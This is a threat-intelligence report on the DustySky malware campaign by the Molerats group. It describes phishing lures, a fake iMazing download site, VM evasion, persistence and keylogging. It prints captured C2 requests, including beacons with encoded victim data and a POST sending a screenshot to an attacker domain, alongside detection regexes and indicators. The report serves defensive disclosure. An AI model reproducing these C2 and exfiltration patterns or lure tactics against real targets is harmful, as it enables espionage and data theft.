It is in use by\nthe Molerats (aka Gaza cybergang), a politically motivated group whose main objective, we believe, is\nintelligence gathering. Operating since 2012, the group's activity has been reported by Norman [1],\nKaspersky[2,3], FireEye[4], and PwC[5].\n\nThis report revolves around a campaign that includes a new malware developed by a member of the group\nor on behalf of the group. Based on dozens of known attacks and the vast infrastructure in use - we estimate\nthat a wave of targeted malicious email messages has been sent on a weekly basis.\n\nThese attacks are targeted, but not spear-phished. I.e., malicious email messages are sent to selected targets\nrather than random mass distribution, but are not tailored specifically to each and every target. Dozens of\ntargets may receive the exact same message. The email message and the lure document are written in\nHebrew, Arabic or English - depending on the target audience.\n\nTargeted sectors include governmental and diplomatic institutions, including embassies; companies from the\naerospace and defence Industries; financial institutions; journalists; software developers.\n\nThe attackers have been targeting software developers in general, using a fake website pretending to be a\nlegitimate iOS management software, and linking to it in an online freelancing marketplace.\n\nMost targets are from the Middle East: Israel, Egypt, Saudi Arabia, United Arab Emirates and Iraq. The United\nStates and countries in Europe are targeted as well.\n\n###### Acknowledgments\n\nWe would like to thank our colleagues for their ongoing information sharing and feedback, which have been\ncrucial for this research: security researcher Infra; [PassiveTotal analyst team; Tom Lancaster of PwC;](https://www.passivetotal.org/) [Team](http://www.team-cymru.org/)\n[Cymru; Security researcher Sebastián García; Menachem Perlman of LightCyber; Other security researchers](http://www.team-cymru.org/)\nwho wish to remain anonymous.\n\n[1](https://github.com/kbandla/APTnotes/blob/master/2012/Cyberattack_against_Israeli_and_Palestinian_targets.pdf) [https://github.com/kbandla/APTnotes/blob/master/2012/Cyberattack_against_Israeli_and_Palestinian_targets.pdf](https://github.com/kbandla/APTnotes/blob/master/2012/Cyberattack_against_Israeli_and_Palestinian_targets.pdf)\n[2](http://www.seculert.com/blog/2014/01/xtreme-rat-strikes-israeli-organizations-again.html) [http://www.seculert.com/blog/2014/01/xtreme-rat-strikes-israeli-organizations-again.html](http://www.seculert.com/blog/2014/01/xtreme-rat-strikes-israeli-organizations-again.html)\n[3](https://securelist.com/blog/research/72283/gaza-cybergang-wheres-your-ir-team) [https://securelist.com/blog/research/72283/gaza-cybergang-wheres-your-ir-team](https://securelist.com/blog/research/72283/gaza-cybergang-wheres-your-ir-team)\n[4](https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html) [https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-](https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html)\n[ivy.html](https://www.fireeye.com/blog/threat-research/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html)\n[5](http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html) [http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html](http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html)\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 3 of 42\n\n\n-----\n\n## Tactics, Techniques and Procedures\n\n\n###### Delivery \n\nThe attackers would usually send a malicious email message that either links to an archive file (RAR or ZIP\ncompressed) or has one attached to it. Below are malicious email messages that have been sent to multiple\ntargets on September and December 2015.\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 4 of 42\n\n\n-----\n\nThe link may include these parameters:\n\n  - **Id - the ID of the current wave of malicious email messages, composed of a plaintext word, a plus**\nsign, and a number. For example: Rand+281\n\n  - **token1 - same as id, but** Base64 encoded\n\n  - **token2 - Base64 encoded** email address of the target to which the malicious message was sent.\n\n  - **C - the word Click or openexe**\n\nThe following regular expression matches the structure of malicious links:\n\n**\\/[A-Za-z]+\\.php\\?((?:id|token1|token2|C)=[A-Za-z0-9\\/=+%]*={0,2}&?){4}**\n\nFor example:\n_spynews.otzo[.]com/20151104/Update.php?id=>redacted>&token1=>redacted>&token2=>redacted>&C=Cli_\n_ck_\n\nThe archive contains an .exe file, sometimes disguised as a Microsoft Word file, a video, or another file\nformat, using the corresponding icon. For example:\n\n###### Lure content and sender identity\n\nIf the victim extracts the archive and clicks the .exe file, the lure document or video are presented while the\ncomputer is being infected with DustySky.\n\nIn recent samples the group used Microsoft Word files embed with a malicious macro, which would infect\nthe victim if enabled. Note, that these infection methods rely on social engineering - convincing the victim to\nopen the file (and enabling content if it is disabled) - and not on software vulnerabilities.\n\nThe subject line of the malicious email message, as well as the name and content of the lure document, are\nusually related to recent events in diplomacy, defense, and politics. Sometimes lure topics are gossip or sex\nrelated and might even include a pornographic video. In recent samples, fake invoices and a copy of the\npublic Google privacy policy were used.\n\nThe content of the lure document is always copied from a public news item or other web content, and is\nnever an original composition of the attackers.\n\nThe “from” field in malicious messages is usually set to be related to the lure document, such as “Latest\nIsrael news”, “Israeli Hot Stories”, “Israel Defense Forces“,مركز اإلمارات للسياسات \"” (impersonates the Emirates\nPolicy Center organization[6]).\n\n6 “The center undertakes the task of foreseeing the future of region, regional and international policy trends and the\nimpact of different geopolitical projects on the region. It aims at providing strategic analysis, policy papers, studies, and\nresearch to serve the decision makers at any institution or country in the region with a priority given to UAE.”\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 5 of 42\n\n\n-----\n\nWhen linked from the malicious message, the malware would be hosted either on a cloud service (many\ntimes in copy.com, a legitimate file hosting service), or on a server controlled by the attackers.\n\n###### Phishing\n\nWhen the malware is hosted on a server controlled by the attackers, the User-Agent string of the target’s\nbrowser is checked when they click the malicious link. If the target is using Windows, DuskySky is served. If\nthe operating system is different than Windows, the target is served a Google, Microsoft, or Yahoo phishing\npage:\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 6 of 42\n\n\n-----\n\nThe source code of the phishing page is made up of a single JavaScript block, which at runtime decodes a\nsingle variable into HTML:\n\nAfter the victim fills in and sends the fake login form, they are redirected to a legitimate website. For\nexample, in one case the victim was redirected to a news item[7] in the Israeli news website NRG. Only the\nnews item was old (from one year prior to the attack) and unrelated to the original subject of the malicious\nemail message. It was probably used in previous attacks, and the attackers did not care enough or forgot to\nchange it to a relevant one.\n\n###### Attacks against software developers\n\nIP address 45.32.13.169 and all the domains that are pointing to it[8] host a webpage which is a copy of a\nlegitimate and unrelated software website - iMazing, an iOS management software.\n\n**Screenshot of fake website - imazing[.]ga on 45.32.13.169**\n\n[7](http://www.nrg.co.il/online/1/ART2/594/733.html) [http://www.nrg.co.il/online/1/ART2/594/733.html](http://www.nrg.co.il/online/1/ART2/594/733.html)\n[8](https://www.passivetotal.org/passive/45.32.13.169) [https://www.passivetotal.org/passive/45.32.13.169](https://www.passivetotal.org/passive/45.32.13.169)\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 7 of 42\n\n\n-----\n\nAmong the domains is a similar looking one - imazing[.]ga.\n\nThe source code of the fake website reveals that it was copied from the legitimate source on 22 October\n2015:\n\nThe fake website, similarly to the legitimate one, offers visitors to download the iMazing software. However,\nthe version on the fake website is bundled with DustySky malware. Upon execution of the malicious version\n(2f452e90c2f9b914543847ba2b431b9a) the legitimate iMazing is installed, while in the background\nDustySky is dropped as a file named Plugin.exe (1d9612a869ad929bd4dd16131ddb133a), and executed:\n\nPlugin.exe immediately starts communicating with its command and control sever using the hardcoded\naddress ns.suppoit[.]xyz and supo.mefound[.]com, both also pointing to above mentioned 45.32.13.169.\n\nInterestingly, we found the fake domain imazing[.]ga mentioned in a job posting[9] in the freelancers\nmarketplace website freelancer.com. In the posting, the attackers claim they are looking for someone to\n\n9 https://www.cz.freelancer.com/projects/iPhone/Write-some-Software-8755699/\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 8 of 42\n\n\n-----\n\nbuild “an application like that this website [sic]” and entice the viewer to “download application and take an\n_overlook [sic]” from imazing[.]ga and “Let me know if any idea is missing or…”._\n\nThis behavior deviates from the attackers’ usual pattern of sending malicious email to selected (albeit many)\nindividuals. It is unclear to us why they would go after random infections, but we can imagine various\nreasons, such as access to computers which would be used as proxies for attacks, or access to licenses for\nsoftware owned by the victims.\n\n### Post infection\n\nThis section describes the actions performed by the attackers on infected computers we have investigated.\n\nAfter infecting the computer, the attackers used both the capabilities of DustySky, and those of public\nhacking tools they had subsequently downloaded to the computer.\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 9 of 42\n\n\n-----\n\nThey took screenshots and a list of active processes in the computer, and sent them to their command and\ncontrol severs. They used BrowserPasswordDump[10], a public and free-to-use tool that recovers passwords\nsaved in browsers. Below is the log file (empty in this case) that we recovered after the attackers had deleted\nit:\n\nThe malware would also scan the computer for files that contain certain keywords. The list of keywords, in\nbase64 format, is retrieved from the command and control as a text file.

They also logged in from 5.101.140.118, an IP address that belongs to a proxy\nservice called privatetunnel.com (in previous incidents, emails were sent from a nearby address **5.101.140.114).**\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 11 of 42\n\n\n-----\n\n## Malware analysis\n\n\nDustySky (called NeD by its developer) is a multi-stage malware written in .NET. This chapter reviews its\nfunctionality and main features. The sample analyzed is f589827c4cf94662544066b80bfda6ab from late\nAugust 2015. It is composed of a DustySky dropper, DustySky core, and the DustySky keylogging component.\n\n###### DustySky dropper\n\nThe DustySky dropper tries to evade running in a virtual machine. Once sure the computer is not a VM, it\nextracts, runs and adds persistency to DustySky Core. It extracts basic information about the operating\nsystem and checks for the existence of an Antivirus. It also extracts and opens the lure document.\n\nThe dropper's resources are two components that are dropped at run time. One is the lure document\n(internally called “news”), which is presented to the victim once the dropper is executed. The other is\nDustySky Core, a Trojan backdoor, (internally called “log”).\n\nThe dropper uses the following function to obfuscate the name of functions and other parts of the malware\n(In later versions, SmartAssembly 6.9.0.114 .NET obfuscator was used):\n\nSo, for example, the following string:\n\nIs encoded as:\n\nFor VM evasion the dropper checks whether there is a DLL that indicate that the malware is running in a\nvirtual machine (vboxmrxnp.dll and vmbusres.dll which indicate vitualbox and vmGuestlib.dll which indicates\nvmware).\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 12 of 42\n\n\n-----\n\nIf the dropper is indeed running in a virtual machine, it will open the lure document and stop its activity:\n\nThe dropper uses Windows Management Instrumentation[11] to extract information about the operating\nsystem and whether an antivirus is active.\n\nDustySky Core is dropped to %TEMP% and runs using either cmd or the .NET interface.\n\n11 [https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/aa394582(v=vs.85).aspx)\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 13 of 42\n\n\n-----\n\nA registry entry is created for persistency after computer restart:\n\n###### DustySky core\n\nDustySky Core is a Trojan backdoor and the main component of the malware. It communicates with the\ncommand and control server, exfiltrates collected data, information and files, and receives and executes\ncommands. It has the following capabilities:\n\n  - Collecting information about the OS version, running processes and installed software.\n\n  - Searching for removable media and network drives, and duplicating itself into them.\n\n  - Extracting other components (such as the keylogging component) or receiving them from the\ncommand and control server, and running or removing them.\n\n  - Evading virtual machines.\n\n  - Turning the computer off or restarting it.\n\n  - Making sure only a single instance of the malware is running.\n\nThe keylogging log file is uploaded to the server every 50 seconds. The files are uploaded via a POST request\nto a URL that ends with key.php.\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 14 of 42\n\n\n-----\n\n###### DustySky keylogging component \n\nOne of the components contained in DustySky core is a keylogger (for example\n15be036680c41f97dfac9201a7c51cfc). When ordered by the command and control server, the keylogger is\nextracted and executed. Keylogging logs are saved to %TEMP%\\temps .\n\n###### pdb analysis\n\npdb strings in DustySky sample were structured as follows:\n\n_b:\\World-2015\\IL\\Working Tools\\2015-12-27 NeD Ver 9 Rand - 192.169.6.199\\NeD_\n_Worm\\obj\\x86\\Release\\MusicLogs.pdb_\n\npdb strings from 23 samples are presented in “Appendix B - Indicators”.

If it does not receive\nan OK, it will try a second domain.\n\nFor example, this is an Initial GET request to index.php:\n```\n     GET /index.php HTTP/1.1\n     Host: facetoo.co].[vu\n     Connection: Keep-Alive\n\n```\n\nServer reply:\n\n```\nHTTP/1.1 200 OK\nDate: Sun, 06 Sep 2015 19:52:49 GMT\nServer: Apache/2.2.15 (CentOS)\nX-Powered-By: PHP/5.3.3\nContent-Length: 2 \nConnection: close\nContent-Type: text/html; charset=UTF-8\nOK\n\n```\n\nNext, a GET request is sent with information about the infected computer as Base64 parameters:\n\n```\n     GET\n     /IOS.php?Pn=9TbmRvd3KTxpbmRvd3icj4&fr=&GR=RmFjZUJvb2soSU9TKTxicj4gMjAxNS\n     0wOC0yNA&com=IDxicj4gIDxicj4g&ID=386578203222222738119472812481673914678\n     &o=TWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwg&ho=ZmFjZXRvby5jby52dQ==&\n     av=&v=501P HTTP/1.1\n     User-Agent: 386578203222222738119472812481673914678\n     Host: facetoo.co].[vu\n\n```\nAnother example of a URL in the GET request:\n```\n     http://ra.goaglesmtp.co.vu/NSR.php?Pn=MWw1bEoxVDJqQiB8IFBTUFVCV1M&fr=&GR\n     =REFGQksoTlNSKTxicj4gMjAxNS0xMS0wNA&com=IDxicj4gIDxicj4g&ID=133279209241\n\n```\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 16 of 42\n\n\n-----\n\n```\n     34561851231757518321517760252DAFBK&o=TWljcm9zb2Z0IFdpbmRvd3MgNyBIb21lIFB\n     yZW1pdW0g&ho=cmEuZ29hZ2xlc210cC5jby52dQ==&av=&v=704\n\n```\n**Parameters**\n\nParameter Structure and meaning\n\n**Pn** <computer name< | >user name>\n\n**GR** hardcoded campaign identifier in the form of <token1 (token2)> <br> <date>\n\nfor example:\n\n“wikileaks (Ra) <Br>2015-06-11” or “meshal(Music)<Br>2015-07-15<br>”\n\n**com** <br> <br>\nNever used.\n\n**ID** <identification number>\n\n**o** >operating system<\n\n**Ho** <host>\n\n**av** Anti-virus name\n\n**v** DustySky malware version\n\nThe following regular expression matches the communication patterns:\n\n**\\/[A-Za-z]{2,5}\\.php\\?(?:(Pn|fr|GR|com|ID|o|ho|av|v)=[A-Za-z0-9\\/=+]*={0,2}&?){5,9}**\n\nStolen information sent to command and control as POST requests:\n```\nPOST /RaR.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: 1042541562231131292551331782259622162135190107BK\nHost: down.supportcom.xyz\nContent-Length: 109127\nExpect: 100-continue\nke=iVBORw0KGgoAAAANSUhEUgAAAyAAAAJYCAYAAACadoJwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjw\nv8YQUAAAAJcEh....\nID=1042541562231131292551331782259622162135190107BK&\nN=Screen-2015-10-06_05-15-34-PM.png\nHTTP/1.1 100 Continue\n\n###### SSL and digital certificates \n\n```\nRecently, command and control communication changed from HTTP to HTTPS.

It's worth noting that all IP addresses have been active in the past several\nweeks with many of the domains resolving to them being a combination (green squares) of dynamic DNS\nproviders (blue squares) and registered domains (brown squares). These heatmaps allow us to identify\ninteresting periods or changes in the infrastructure that may have been due to actors adjusting their tactics.\n\nReader:\n\n**192.161.48.59**\n\nIn this graph, we can see the actors used a combination of dynamic DNS and registered domains up until\nDecember 23rd. On that day, the actors seem to remove the registered domain and strictly use dynamic\nDNS. It's unclear why this would occur, but it's possible that the server changed functions in the attack or\nwas no longer needed.\n\n**192.52.167.235**\n\nIn this graph, the colors clearly segment activity that occurred. The primary period of interest appears to be\nwhen both dynamic DNS and registered domains are in use. This occurs from September 23rd to December\n17th and has a number of days where new domains are associated to the IP address. While not entirely\nknown, this period could reflect the actors going live in their operation. Based on emails sent and\ncompilation dates, there were plenty of phishing campaigns going on during this period of time. It's also\nworth noting that this IP address is no longer showing any content which could mean it's been taken offline.\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 20 of 42\n\n\n-----\n\n**167.160.36.14**\n\nIn this graph, we see activity starting on September 9th being directed to a dynamic DNS provider. Similar to\nGraph One, we can see an increase in domains around the November timeframe with a drop-off in\nDecember. Again, not entirely clear, but November may have been a point where the attackers felt the need\nto diversify the domains they were using in attacks.\n\n**45.32.13.169**\n\nIn this graph, the gray blocks indicate that no activity was captured for a majority of the time. Starting\nNovember 9th, the actors introduced four unique, registered domains before then adding dynamic DNS\nproviders. What's most interesting about this IP address is that the content for both dynamic DNS urls and\nregistered domains lead to the same download page that hosts a Windows executable. It's unclear why the\nattackers continue to use both, but the move from registered domains to also using dynamic DNS domains\ncould suggest the actors are beginning to wise up. The use of dynamic DNS infrastructure makes attribution\nand tracking more difficult as a dynamic DNS domain could be shared by unrelated parties.\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 21 of 42\n\n\n-----\n\n**72.11.148.147**\n\nIn this graph, we see the same lack of data until recent months and the use of both dynamic DNS and\nregistered domains. Given the recent activity and a large amount of domains being pointed at this IP\naddress, it's plausible that this server may be the most current of the actors. In fact, it could be involved in\non-going operations that we have seen into this year.\n\n______________________________________________________________________________\n\n[© Clearsky - Cyber security. clearskysec.com](http://clearskysec.com/)\n\nPage 22 of 42\n\n\n-----\n\n## Threat actor and Attribution\n\n\nWe attribute the DustySky attacks, with medium-high certainty, to the same group that FireEye[12] called\n**Molerats and Kaspersky[13] called Gaza cybergang.
